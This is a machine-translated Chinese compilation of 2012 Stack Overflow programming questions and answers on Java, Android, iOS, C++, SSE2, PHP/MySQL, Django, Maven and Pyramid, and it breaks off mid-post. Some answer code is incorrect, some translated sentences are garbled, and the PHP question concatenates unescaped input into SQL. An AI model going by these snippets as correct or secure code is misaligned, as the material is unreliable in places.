> ID：10989936
> 
> 赞同：0
> 
> 时间：2012-06-12T02:41:04.780
> 
> 标签：xml-parsing, sax, saxparser

我有一个具有以下结构的 XML

```
<abstract>
<p>
This is just a dummy <italic> abstract</italic>. That<italic> is giving</italic> problem
</p>
</abstract> 
```

我想在 SAX 中解析这个 xml。我已经编写了解析器，但在标签的 endElement 函数中

```
</p> 
```

我只得到“问题”而不是标签中的全部数据。有没有办法用 Java 中的 SAX 解析器来解析它？

# facebook - Web 应用程序与 facebook 的集成（架构问题）

> ID：10989940
> 
> 赞同：0
> 
> 时间：2012-06-12T02:41:37.343
> 
> 标签：facebook, api, integration

我正在 facebook 上构建自己的社交平台，欢迎对我的网络应用程序架构提出一些建议。

我需要一些从 Facebook API 返回的数据，以便获取我知道我需要让我的用户使用 Facebook (OAuth 2.0) 登录的数据。在这之后，我有点困惑。

我是否应该从后端调用 Facebook API（我正在使用 Python），然后返回相同的数据作为响应？

我是否应该从前端（浏览器的 Javascript）调用 Facebooks API，然后将该数据再次发送到我的后端？

用户授权我的应用程序后，后端是否可以继续从 facebook API 获取信息？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:47:34.527

获得 Facebook 访问令牌后，如何使用它真的取决于您。如果您只从浏览器访问 Facebook API 并且从服务器访问它，那完全没问题。这完全取决于您想要达到的目标。

如果您希望后端能够访问 Facebook API，则需要拥有访问令牌。此外，令牌有一个到期日期，所以只要它有效，后端就可以继续向 Facebook 请求数据，但一旦它到期，你就必须更新它。

# java - 如何显示 ArrayList 中除一个元素外的所有元素？

> ID：10989941
> 
> 赞同：1
> 
> 时间：2012-06-12T02:41:37.510
> 
> 标签：java, arraylist, element

我想显示 中的所有元素`ArrayList`，除了元素 10（这是单词“will”）。我该怎么做呢？当我运行下面的代码时，它什么也没显示。

```
 private void practiceButtonActionPerformed(java.awt.event.ActionEvent evt) {
     ArrayList <String> practice1 = new ArrayList();
     Collections.addAll(practice1, "If", "she", "boarded", "the", "flight"
                        , "yesterday", "at",  "10:00,", "she", "will", "be"
                        , "here", "anytime", "now.");
     contentTextPane.setText(practice1.get(0+1+2+3+4+5+6+7+8+9+11+12+13));
 } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T02:45:13.123

您可以像这样删除列表的第 10 个元素：

```
someList.remove(10); 
```

您可以像这样连接列表的每个元素：

```
StringBuilder text = new StringBuilder();
for (String thisString : someList) {
    text.append(thisString).append(" ");
}

// test it
System.out.println(text.toString()); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T02:45:28.383

线

```
practice1.get(0+1+2+3+4+5+6+7+8+9+11+12+13) 
```

不做你认为它做的事。这将计算 0 + 1 + 2 + ... + 13 的值，然后在`ArrayList`. 由于你`ArrayList`没有这么多元素，它会抛出`IndexOutOfRange`异常。

如果要显示除第十个元素之外的所有内容，请尝试使用循环：

```
StringBuilder builder = new StringBuilder();
for (int i = 0; i < practice1.size(); i++) {
    if (i != 10) {
        builder += practice1.get(i);
    }
}
contextTextPane.setText(builder.toString()); 
```

希望这可以帮助！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-12T02:45:54.463

它什么也不显示，因为您正在使用不存在的语法从列表中检索元素

```
0+1+2+3+4+5+6+7+8+9+11+12+13 
```

只是评估为所有数字的总和，然后用于获取超出范围的元素。

你需要做的是类似

```
String r = "";
for (int i = 0; i < practice.size(); ++i)
  if (i != 10)
    r += practice.get(i);

contentTextPane.setText(r); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-12T02:46:38.160

```
private void practiceButtonActionPerformed(java.awt.event.ActionEvent evt) {
    ArrayList <String> practice1 = new ArrayList();

    Collections.addAll(practice1, "If", "she", "boarded", "the", "flight", "yesterday", "at",  
 "10:00,", "she", "will", "be", "here", "anytime", "now.");

    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < practice1.size(); i++) {
        if (i == 10) {
            continue;
        }
        sb.append(practice1.get(i));
        if (i != practice1.size()-1) {
            sb.append(' ');
        }
    }

    contentTextPane.setText(sb.toString());
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-12T02:46:51.463

调用`practice1.get(0+1+2+3+4+5+6+7+8+9+11+12+13)`在实践中为您提供索引 81 处的对象，该对象等于参数值的总和，引发 ArrayIndexOutOfBoundsException。

相反，您应该遍历这些值并将它们添加到 StringBuilder。

```
StringBuilder sb = new StringBuilder();
for (int i = 0; i < practice1.size(); i++) {
    if (i != 10) {
        sb.append(practice1.get(i));
        sb.append(" ");
    }
}
contentTextPane.setText(sb.substring(0, sb.length() - 1)); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-12T02:45:24.110

尝试使用这个：

```
practice1.get(0) + practice1.get(1) + ... 
```

...而不是这个：

```
contentTextPane.setText( practice1.get(0+1+2+3+4+5+6+7+8+9+11+12+13) ); 
```

虽然最好使用循环。

# java - 一个应用程序在 Android 的较低 API 级别出现编译错误时能否顺利运行？

> ID：10989947
> 
> 赞同：1
> 
> 时间：2012-06-12T02:42:17.953
> 
> 标签：java, android, api, compilation

Android 中的这个方法**MotionEvent.getPointerCount ()**从 API 级别 5 开始才开始使用。

但是，我的项目针对的是 Android OS v2.2（API 级别 8）。

所以我想知道当我的项目在 API 级别 4 的设备上运行时，Android 会做什么。

我试过一次，但是好像没有异常还是crash，不知道为什么？

```
@Override
public boolean onTouch(View v, MotionEvent event) {
    int pointCount = event.getPointerCount();
    ...
    } 
```

仅供参考，当我将项目的 API 级别设置为 4 时，上述代码会导致编译错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T04:15:15.007

在 Android 中，如果您使用不可用的方法，您将获得[NoSuchMethodException](http://developer.android.com/reference/java/lang/NoSuchMethodException.html "NoSuchMethodException")。

您可以查看[应用程序的向后兼容性以](http://developer.android.com/resources/articles/backward-compatibility.html "应用程序的向后兼容性")获取更多信息。

所以你的问题的答案是：是的，一个应用程序可以顺利运行，同时在较低的 API 中出现错误。

# c - SSE 2 函数执行时间不恒定且超过正常值

> ID：10989949
> 
> 赞同：0
> 
> 时间：2012-06-12T02:43:04.200
> 
> 标签：c, sse2

在 Intel core2Duo 上使用 SSE 2。

sse_add() 和 normal_add() 所花费的时间在多次运行中不是恒定的，实际上现在经过多次修改后总是为 0。

该程序基本上找到以下矩阵的每一列的总和：

```
 1,2,10,13,15,160,6,19

  1,2,10,13,15,160,6,19

  1,2,10,13,15,160,6,19

  1,2,10,13,15,160,6,19

  1,2,10,13,15,160,6,19

  1,2,10,13,15,160,6,19

  1,2,10,13,15,160,6,19

  1,2,10,13,15,160,6,19 
```

我已经验证了结果，并且这两个函数都正确：

```
 results= 8, 16, 80, 104, 120, 1280, 48, 152 
```

为什么会这样？还是因为我没有正确测量时间？您能否在您的机器上运行相同的代码并进行验证？

**更新**根据建议，**我放了一个 for 循环，如下所示，但时间仍然为 0（显然我必须将总时间除以迭代次数以获得正确的值，但为什么我得到总时间 0？）：**

```
 // variable declarations used for time calculation
 double elapTicks;
 double elapMilli ;
 double begin = BeginTimer();

   for(int i=0; i<1000000000;i++)

   {

  //sum of consecutive rows 
  __m128i t1=_mm_adds_epi16(    x1[0] ,   x2[0]  );
  __m128i t2=_mm_adds_epi16(    x3[0] ,   x4[0]  );
  __m128i t3=_mm_adds_epi16(    x5[0] ,   x6[0]  );
  __m128i t4=_mm_adds_epi16(    x7[0] ,   x8[0]  );

 //t5=t1+t2 & t6=t3 + t4
 __m128i t5=_mm_adds_epi16(  t1 ,t2  );
 __m128i t6=_mm_adds_epi16(  t3 ,t4  );

 ///t7=t6+t5, which is final answer 
 __m128i t7=_mm_adds_epi16(  t5 ,t6  );

 }

   printf ("Timer set to: %f\n", begin);
 // variable definitions  to calculate time taken
     elapTicks = EndTimer(begin)-begin;    // stop the timer,and calculate the time 
     taken
     elapMilli = elapTicks/1000;     // milliseconds from Begin to End
     printf ("Time  in SSE in Milliseconds : %f\n", elapMilli); 
```

}

原始程序如下。

****更新：****删除所有 printf 和 malloc* *

在单独的程序中一一计时功能：

**上证版**

```
 clock_t BeginTimer()
 {
 //timer declaration
 clock_t Begin; //initialize Begin
 Begin = clock() * CLK_TCK; //start the timer
 return Begin;
 }
 clock_t EndTimer(clock_t begin)
 {
 clock_t End;
 End = clock() * CLK_TCK;   //stop the timer
 return End;
 }

 int  main( )
 {
   sse_add();
   getch();       
  return 0;
  }

void sse_add()
{

__declspec(align(16)) unsigned short a1[8]={1,2,10,13,15,160,6,19};   
    __declspec(align(16)) unsigned short a2[8]={1,2,10,13,15,160,6,19};
__declspec(align(16)) unsigned short a3[8]={1,2,10,13,15,160,6,19};
__declspec(align(16)) unsigned short a4[8]={1,2,10,13,15,160,6,19};
__declspec(align(16)) unsigned short a5[8]={1,2,10,13,15,160,6,19};
__declspec(align(16)) unsigned short a6[8]={1,2,10,13,15,160,6,19};
__declspec(align(16)) unsigned short a7[8]={1,2,10,13,15,160,6,19};
__declspec(align(16)) unsigned short a8[8]={1,2,10,13,15,160,6,19};

   //__m128i maps to the XMM[0-7] registers
   __m128i *x1 = (__m128i*) &a1[0];  
   __m128i *x2 = (__m128i*) &a2[0]; 
   __m128i *x3 = (__m128i*) &a3[0];   
   __m128i *x4 = (__m128i*) &a4[0];          
   __m128i *x5 = (__m128i*) &a5[0];   
   __m128i *x6 = (__m128i*) &a6[0];   
   __m128i *x7 = (__m128i*) &a7[0];   
   __m128i *x8 = (__m128i*) &a8[0];   

//  _mm_adds_epi16 : Adds the 8 signed 16-bit integers in a to the 8 signed \
    //16-bit  integers in b and saturates.

 // variable declarations used for time calculation
    float elapTicks;
    float elapMilli ;

   double begin = BeginTimer();
       printf ("Timer set to: %.2f\n", begin); // print the initialised timer (0)

  //sum of consecutive rows 
      __m128i t1=_mm_adds_epi16(    x1[0] ,   x2[0]  );
      __m128i t2=_mm_adds_epi16(    x3[0] ,   x4[0]  );
      __m128i t3=_mm_adds_epi16(    x5[0] ,   x6[0]  );
      __m128i t4=_mm_adds_epi16(    x7[0] ,   x8[0]  );

   //t5=t1+t2 & t6=t3 + t4
     __m128i t5=_mm_adds_epi16(  t1 ,t2  );
     __m128i t6=_mm_adds_epi16(  t3 ,t4  );

   ///t7=t6+t5, which is final answer 
   __m128i t7=_mm_adds_epi16(  t5 ,t6  );

// variable definitions  to calculate time taken
elapTicks = EndTimer(begin);    // stop the timer, and calculate the time taken
elapMilli = elapTicks/1000;     // milliseconds from Begin to End
printf ("Time  in SSE in Milliseconds : %.2f\n", elapMilli);

} 
```

**普通版**

```
 clock_t BeginTimer()
 {
 //timer declaration
 clock_t Begin; //initialize Begin
 Begin = clock() * CLK_TCK; //start the timer
 return Begin;
 }

 clock_t EndTimer(clock_t begin)
{
clock_t End;
End = clock() * CLK_TCK;   //stop the timer
return End;
}

int  main( )
{

normal_add();
   getch();
  return 0;
}

  void normal_add()
  {

 unsigned short a1[8]={1,2,10,13,15,160,6,19};
 unsigned short a2[8]={1,2,10,13,15,160,6,19};
 unsigned short a3[8]={1,2,10,13,15,160,6,19};
 unsigned short a4[8]={1,2,10,13,15,160,6,19};
 unsigned short a5[8]={1,2,10,13,15,160,6,19};
 unsigned short a6[8]={1,2,10,13,15,160,6,19};
 unsigned short a7[8]={1,2,10,13,15,160,6,19};
 unsigned short a8[8]={1,2,10,13,15,160,6,19};

   unsigned short t1[8], t2[8], t3[8], t4[8],t5[8], t6[8], t7[8];   

   float elapTicks;
       float elapMilli ;

double begin1 = BeginTimer();
    printf ("Timer reset to: %f\n", begin1); // print the initialised timer (0)

 for(int i=0; i<8;i++)
 {
 t1[i]=a1[i] +a2[i];
 }

 for(int i=0; i<8;i++)
 {
 t2[i]=a3[i] +a4[i];
 }

 for(int i=0; i<8;i++)
 {
 t3[i]=a5[i] +a6[i];
 }

 for(int i=0; i<8;i++)
 {
 t4[i]=a7[i] +a8[i];
 }

 for(int i=0; i<8;i++)
         {
 t5[i]=t1[i] +t2[i];
 }

 for(int i=0; i<8;i++)
         {
 t6[i]=t3[i] +t4[i];
 }

 for(int i=0; i<8;i++)
 {
 t7[i]=t5[i] +t6[i];
 }

 elapTicks = EndTimer(begin1);    // stop the timer, and calculete the time taken
   elapMilli = elapTicks/1000;     // milliseconds from Begin to End
   printf ("Time spent in normal add in Milliseconds : %.2f\n", elapMilli);

  } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T03:08:15.657

`printf()`and调用很容易支配这`malloc()`两个函数的执行时间，这也可能是时间变化的来源。

没有必要在`malloc()`那里调用 - 事实上你有内存泄漏，因为你调用它然后立即覆盖它的返回值。

如果您想分析这些功能，请将添加逻辑本身与打印逻辑分开，并多次调用前者，而不仅仅是一次。这将摊销由外部事件（如中断）引起的随机变化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:08:38.510

你没有提到你得到的时间变化有多大，但有些变化是可以预料的。指令并不总是以相同的时间执行，原因包括操作系统调度和其他运行线程引起的内存瓶颈，以及 CPU 中晶体管的充电变化。涉及的变量如此之多，以至于您不能指望确定一个精确的时间。您能做的最好的事情通常是运行几百万次，并在平均执行时间上设置一个置信区间。
现在，如果您的变化很大，也许正在发生其他事情，但没有实际数字，很难判断。

# php - MYSQL 语法错误

> ID：10989952
> 
> 赞同：-1
> 
> 时间：2012-06-12T02:43:52.820
> 
> 标签：php, mysql

我正在尝试在 php 中发送此函数，但它不断返回此错误。

> 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 2 行的 ''tolu)' 附近使用正确的语法

```
function getDuplicate($case, $select,$from,$where,$equals,$and="",$equals2=""){

global $database_conndb;
global $conndb;

switch($case){
      case 1:
      $sql= "SELECT {$select} FROM {$from} WHERE {$where}='{$equals}'";
      break;
      case 2:
      $sql= "SELECT {$select} FROM {$from} WHERE {$where}='{$equals}' AND {$and} != '{$equals2}'";
      break;
      } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T03:33:06.840

看起来您没有正确转义参数。看看这个函数： http: [//php.net/manual/en/function.mysql-real-escape-string.php](http://php.net/manual/en/function.mysql-real-escape-string.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:35:36.173

如果您确定 SQL 语句中存在错误，则回显 SQL，然后将其复制并手动执行该查询到数据库中。你会得到实际的错误发生点。

希望这就是为什么你会修复你的错误

# c++ - c ++将多个模板类类型限制为派生类

> ID：10989956
> 
> 赞同：1
> 
> 时间：2012-06-12T02:44:54.990
> 
> 标签：c++, templates, c++11

我遵循[模板类限制](https://stackoverflow.com/questions/5750793/template-class-restriction)，但在 gcc 中遇到错误：

错误：一个声明中有多种类型

错误：声明没有声明任何东西

如果我删除 enable_if 块，它就会编译。谁能解释我是否遗漏了什么？

```
template<class A, class B, class C, class D>                                                                               
typename std::enable_if<                                                  
std::is_base_of<baseofA, A>::value &&                      
std::is_base_of<baseofB, B>::value &&      
std::is_base_of<baseofC, C>::value &&            
std::is_base_of<baseofD, D>::value>::type       
class library {
    //whatever
}; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T03:08:03.050

你没有`enable_if`正确使用。`static_assert`在这种情况下会更合适。

```
template<class A, class B, class C, class D>       
class library {
  static_assert(
    std::is_base_of<baseofA, A>::value &&                      
    std::is_base_of<baseofB, B>::value &&      
    std::is_base_of<baseofC, C>::value &&            
    std::is_base_of<baseofD, D>::value, 
    "template argument A must derive from baseofA and so on ..." );
      //whatever
}; 
```

如果您想`enable_if`改用，您必须创建一个虚拟模板参数，该参数取决于启用的类型，才能按您的意愿工作。

```
template<class A, 
         class B, 
         class C, 
         class D, 
         class _ = 
           typename std::enable_if<                                                  
             std::is_base_of<baseofA, A>::value &&                      
             std::is_base_of<baseofB, B>::value &&      
             std::is_base_of<baseofC, C>::value &&            
             std::is_base_of<baseofD, D>::value>
           ::type>
class library {
    //whatever
}; 
```

但是 IMO，该`static_assert`方法更好，因为您可以提供描述性错误消息，而不是编译器抱怨未能找到`type`后一种情况下命名的类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:19:40.730

按照[这个](http://en.cppreference.com/w/cpp/types/enable_if)页面，试试

```
template<class A, class B, class C, class D, class Enable = void>
class library;

template<class A, class B, class C, class D>                                                                      
class library<A, B, C, D, typename std::enable_if< std::is_base_of<baseofA, A>::value &&
                                                   std::is_base_of<baseofB, B>::value &&
                                                   std::is_base_of<baseofC, C>::value &&
                                                   std::is_base_of<baseofD, D>::value >::type
             >
{
    //whatever
}; 
```

请注意，您的示例一定有问题，因为 enable_if<>::type 是一种类型，您不希望在 template<> 行和类库行之间出现这种类型。

# android - Android WebView 客户端

> ID：10989970
> 
> 赞同：2
> 
> 时间：2012-06-12T02:46:56.173
> 
> 标签：android, webview, webviewclient

android中的webview客户端有public方法

```
public class MyWebViewClient extends WebViewClient {

    public MyWebViewClient () {

    }

    @Override
    public void onLoadResource(WebView view, String url) {
        something_happen_here
    }
} 
```

我将WebViewClient 设置为 myWebView

```
myWebView.setWebViewClient(new MyWebViewClient()); 
```

当我将 URL 加载到 myWebView 时，MyWebViewClient 类中的 onLoadResource 方法被加载了两次，我的意思是它两次进入“something_happen_here”行。

任何人都知道为什么会这样？谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-09T11:25:09.623

而不是`MyWebViewClient()`，首先为客户端创建此函数：

```
private class BasicWebViewCient extends WebViewClient {  
    @Override   
    public boolean shouldOverrideUrlLoading(WebView view, String url) {    
        view.loadUrl(url);
        return true;  
    }  
} 
```

在你想使用的地方，`BasicWebViewCient`像这样实现：

```
MyWebView1.setWebViewClient(new BasicWebViewCient()); 
```

希望这有帮助。

# maven - 每个 svn trunk 是否有一个（多模块）maven 项目

> ID：10989973
> 
> 赞同：7
> 
> 时间：2012-06-12T02:47:37.627
> 
> 标签：maven

我通常的做法是每个 svn 主干有一个 maven 项目（可以是多模块），如下所示：

```
trunk/ (style 1)
  /pom.xml
  /submod-1
  /submod-2 
```

基本上，整个主干被视为一个单独的发布包。我发现这更容易管理。有一个聚合/父 pom 来管理此主干中的所有模块。

但是，我注意到我的一些同行是这样组织的：

```
trunk/ (style 2)
  /project-1
    /pom.xml
  /project-2
    /pom.xml 
```

基本上，在单个 svn trunk...project-1 和 project-2 需要分别管理。即，我无法检查树干并将其内容作为单个多模块 maven 项目处理——我很欣赏。

Q1：风格 2 什么时候会是一个好主意，如果有的话？

Q2：有人可以告诉/指出如何使用颠覆来管理 Maven 项目的最佳实践吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T04:54:39.280

我见过这两种情况。

在我看来，这取决于项目/模块的独立程度。如果他们有自己的发布计划，那么拥有自己的主干、分支和标签对他们来说是有意义的。但是，如果项目/模块总是一起发布，那么将它们作为单个主干的一部分可能是有意义的。

从 Maven 的角度来看，如果多模块项目的模块`<version>`从父级继承，那么它应该遵循`style 1`上述。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:15:24.680

我非常同意@Raghuram 的回答，但想补充以下内容：

*   如果要发布相同生命周期和相同版本号的项目，则需要 Style 1，其父 POM 在主干的根目录中。然后，这个父 POM 通常包含子项目作为要从根目录构建的*模块。*
*   如果您有一组独立的项目（例如实用程序），则样式 2 很有意义，您需要一个单一的 SVN 位置（以便于管理），但有不同的发布周期。在这种情况下，您不需要将单个项目包含为*modules*的根聚合器 POM 。为实用程序项目提供一个通用的父 POM 可能仍然有意义，它集中了编译器设置和插件管理等内容。与样式 1 的不同之处在于您永远不会一起发布所有项目。您将仅发布父 POM 的稳定版本，然后根据需要发布单个实用程序项目。

我们已经成功地使用了这两种风格 - 主要区别实际上在于您用于发布的方式和频率。

对于样式 2（和实用程序项目示例），如果这些项目共享相同的 SVN 标签和主干，我看不到问题。开发人员仍然可以决定是要检查整个实用程序主干还是只检查单个项目。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T06:34:03.980

只要看看[这个](https://stackoverflow.com/questions/2611237/subversion-repository-layout)问题，至少看看它的最高答案。它实际上总结了这个案例，并说得很清楚。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-25T08:50:00.383

想想继续集成：这个想法使第一个方法更灵活地与 CI 服务器（如 jinkins、bitbucket 或竹子）一起使用......

# ios - UITableViewCell 重新加载导致内存泄漏

> ID：10989975
> 
> 赞同：0
> 
> 时间：2012-06-12T02:48:00.290
> 
> 标签：ios

我的代码是

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

    NSString *CellIdentifier1 = [NSString stringWithFormat:@"SimpleCell"];

    UITableViewCell *cell1 = [tableView dequeueReusableCellWithIdentifier:nil];

    if (cell1 == nil) {
        cell1 = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier1] autorelease];

    }
    return cell1;
} 
```

这总是会导致 libsystem_c.dylib mallic 内存泄漏 48 字节。并且每次调用 reloadData 时都会累积内存泄漏。

欢迎评论

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T03:58:04.817

这是目前 iOS 中存在的与 UIScrollViews 相关的已知错误。目前您所能做的就是等待系统更新并希望它得到修复。

以下是更多信息： http: [//openradar.appspot.com/11081198](http://openradar.appspot.com/11081198)

# automatic-ref-counting - arc 不允许将“bool”（又名“signed char”）隐式转换为“nsdata *”

> ID：10989978
> 
> 赞同：0
> 
> 时间：2012-06-12T02:48:22.960
> 
> 标签：automatic-ref-counting, xcode4.3

将我的项目迁移到 Obejctive-C ARC 时，出现一个错误：

```
implicit conversion of 'bool' (aka 'signed char') to 'nsdata *' is disallowed with arc 
```

Xcode 所指的函数正在返回`NO`，或者`nil`尽管它的返回类型是 type `NSData`：

```
 - (NSData *)compressBytes:(Bytef *)bytes length:(NSUInteger)length error:(NSError **)err shouldFinish:(BOOL)shouldFinish
    {
        if (length == 0) return nil;
        int status;
            if (status == myVariable) {
            break;
        } else if (status != y_OK) {
        if (err) {
            *err = [[self class] deflateErrorWithCode:status];
        }
        return NO;
    } 
```

但是，我不太确定我知道如何解决这个问题，任何想法都会受到赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T16:55:05.607

在 ARC 下，您只能返回一个对象或 nil。时期。

这是因为 ARC 不仅要求，而且要求您不要对指针做任何可疑的事情——指针要么指向对象，要么指向 nil。

ARC 正在适应，因为您试图将 NO（零值）填充到指针中。这违反了规则，这就是您收到错误的原因。

我们无法帮助您修复它，因为 a) 我们不知道有效的返回值是什么（为什么不？为什么不为零？）。由于这似乎是一个代码片段，因此很难为您提供帮助。对不起。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-14T19:06:19.100

只是不要那样做。NO 在任何意义上都不是该函数的有效返回值。您的代码在 ARC 之前被破坏，现在它仍然被破坏。

此外，这些行：

```
 int status;
  if (status == myVariable) {
        break;
  } 
```

与这些完全相同：

```
if (myVariable == nil) {
    break;
} 
```

除了以一种非常混乱的方式编写，并且依靠 ARC 来初始化状态。我很确定这不是你想要的。

基本上，这种方法看起来完全错误。

# python - python django动态压缩和下载

> ID：10989980
> 
> 赞同：1
> 
> 时间：2012-06-12T02:48:59.190
> 
> 标签：python, html, django

我有一个复选框表单。我正在尝试这样做，如果用户选中“视频”框并提交表单，那么视频文件会被压缩，django 会生成一个动态下载，该下载会弹出在用户屏幕上。我希望音频也能发生同样的情况。但是，如果用户同时选中复选框并提交，则音频和视频文件将合并在一个 zip 中，并为用户弹出下载。我不希望任何这些存储在磁盘上，所以我使用 StringIO。没有下载弹出窗口出现

html

```
<form>
<input type="checkbox" name="list" value="audio"/> Audio<br />
<input type="checkbox" name="list" value="video"/> Video<br />
<input type="submit" value="submit" /> 
</form> 
```

Python

```
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import cgitb; cgitb.enable()
import cgi
from zipfile import ZipFile
from StringIO import StringIO
from django.http import HttpResponse
from django.core.servers.basehttp import FileWrapper
files = 0
def zip (content):
    buffer= StringIO.StringIO()
    z= zipfile.ZipFile( buffer, "w" )
    z.writestr(content)
    z.close()
    # generate the file
    response = HttpResponse(FileWrapper(z), content_type='application/zip')
    response['Content-Disposition'] = 'attachment; filename=z.zip'
    return response
form = cgi.FieldStorage()
mylist = form.getlist('list')
print 'Content-Type: text/plain\n'
for item in mylist:
  if item == 'video':
    files = '../download/video.html'
    zip(files)
  elif item == 'audio':
    files = '../download/audio.html'
    zip(files)
  elif item == 'audio' and 'video':
    files = '../download/audio.html'+'../download/video.html'
    zip(files)
  else:
    print 'nothing selected' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:36:40.397

为了确保 for 循环不能工作，最后一个 elif 中的第三个代码将永远不会执行，因为它与第二个相同，与第二 个`item == 'audio' and 'video'` 相同`item == 'audio and True'``item == 'audio'`

我会更改循环代码以使其看起来更简单

```
files = []
for item in mylist:
  if item == 'video':
    files.append('../download/video.html')
  elif item == 'audio':
    files.append('../download/audio.html')
zip(files) 
```

然后重构 zip 以处理文件列表

```
def zip (filenames):
    buffer= StringIO.StringIO()
    z= zipfile.ZipFile( buffer, "w" )
    [z.writestr(f) for f in filenames]
    z.close()
    # generate the file
    response = HttpResponse(FileWrapper(z), content_type='application/zip')
    response['Content-Disposition'] = 'attachment; filename=z.zip'
    return response 
```

You also have to make sure that the view functions returns what the zip function returns.

# decode - 如何获取ogg文件的所有数据包

> ID：10989982
> 
> 赞同：1
> 
> 时间：2012-06-12T02:49:13.057
> 
> 标签：decode, ogg, oggvorbis, vorbis

我想获取 ogg 文件的所有 vorbis 数据包并将其放入列表中，我现在不想对其进行解码。

现在我已经这样做了：

```
ogg_sync_state oy;
ogg_stream_state os;
ogg_page og;
ogg_packet op;
vorbis_info vi;
vorbis_comment vc;
vorbis_dsp_state vd;
vorbis_block vb;

vorbis_synthesis_init(&vd,&vi);
vorbis_block_init(&vd,&vb);
ogg_sync_pageout(&oy,&og);
ogg_stream_pagein(&os,&og);
ogg_stream_packetout(&os,&op);

//decode packet right now.   if I don't decode it right now then will skip this step

/*
vorbis_synthesis(&vb,&op)
vorbis_synthesis_pcmout(&vd,&pcm)
vorbis_synthesis_read
*/

//continue to get packet 
```

如果我现在解码数据包，那么我可以继续获取数据包。但是，如果我不对其进行解码而只想将它们放入 List 中，那么我将无法获取数据包。我应该怎么做？

# iphone - 将 NSManagedObjects 添加到一对多关系

> ID：10989983
> 
> 赞同：3
> 
> 时间：2012-06-12T02:49:32.687
> 
> 标签：iphone, objective-c, core-data, many-to-many, one-to-many

我有一对多的关系，例如一个学生有很多课。

为什么当我运行以下代码时`_classes`没有新`Cls`对象？然而，当我关闭应用程序并重新打开它时。

作为后续问题，如何在添加新课程后立即获得新课程列表？

```
NSMutableSet* classes = [student mutableSetValueForKey:@"classes"];
NSManagedObject* cls = [NSEntityDescription insertNewObjectForEntityForName:@"Cls" inManagedObjectContext:context];
[cls setValue:name forKey:@"name"];
[student addClassesObject:cls];

NSError* err;
[context save:&err];

NSMutableSet* _classes = [student mutableSetValueForKey:@"classes"]; 
```

这就是我的 addClassesObject: 操作的样子（由 XCode 自动生成）

```
- (void)addClassesObject:(Cls*)cls
{

} 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T03:21:31.183

您不能直接将对象添加到集合中。您需要使用 Core Data 生成的访问器或您自己的自定义访问器。查看您的 .h 文件，您应该会看到类似于以下内容的内容

```
-(void)addClsObject:(Cls *)theObject; 
```

和

```
-(void)addClsObjects:(NSSet *)set; 
```

因此，对于您的特定情况，一旦您拥有 Cls 对象，您将执行以下操作：

```
[student addClassesObject:cls]; 
```

然后执行你保存，你应该能够检索类集。仅供参考，调用此方法和 relatd NSSet relatd 方法也会为您设置反向关系。

祝你好运

吨

# python - Pyramid：为什么我不能在没有授权策略的情况下使用身份验证策略？

> ID：10989985
> 
> 赞同：3
> 
> 时间：2012-06-12T02:50:20.297
> 
> 标签：python, authentication, authorization, pyramid

正如标题所说：为什么我不能使用没有授权策略的身份验证策略？

仅设置身份验证策略会导致：

```
pyramid.exceptions.ConfigurationExecutionError: <class 'pyramid.exceptions.ConfigurationError'>:
    Cannot configure an authentication policy without also configuring
    an authorization policy (use the set_authorization_policy method) 
```

显然，指定这两种策略*通常*是有意义的……但为什么 Pyramid 会*强制*你同时指定这两种策略呢？

我（可能是幼稚的？）只指定身份验证策略的动机是，现在，我想“手动”处理授权，而不涉及 Pyramid 的授权“东西”。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-16T01:21:09.760

需要授权策略没有令人信服的理由。`ACLAuthorizationPolicy`我只能说，尝试将系统安装到或构建自定义系统是值得的。如果您不打算这样做，只需添加 acl 策略，不要担心。策略非常懒惰，只有在您使用视图权限或通过调用时才会`has_permission`调用。

# android - 在 VideoView 的图库中显示视频

> ID：10989991
> 
> 赞同：1
> 
> 时间：2012-06-12T02:51:38.387
> 
> 标签：android

我的 UI 有一个按钮和一个 videoview。当我们单击按钮时，转到 Gallery Video，当我们在 Video Gallery 中选择一个视频时，它会返回我的 UI，videoview 将显示被选中的视频..我使用如下代码但它没有'不显示视频:(

```
public class VideoGalleryActivity extends Activity {
/** Called when the activity is first created. */
Button button;
VideoView videoView;
private static final int PICK_FROM_GALLERY=1;
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    button=(Button)findViewById(R.id.button);
    videoView=(VideoView)findViewById(R.id.videoview);

    button.setOnClickListener(new OnClickListener() {

        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent intent = new Intent();

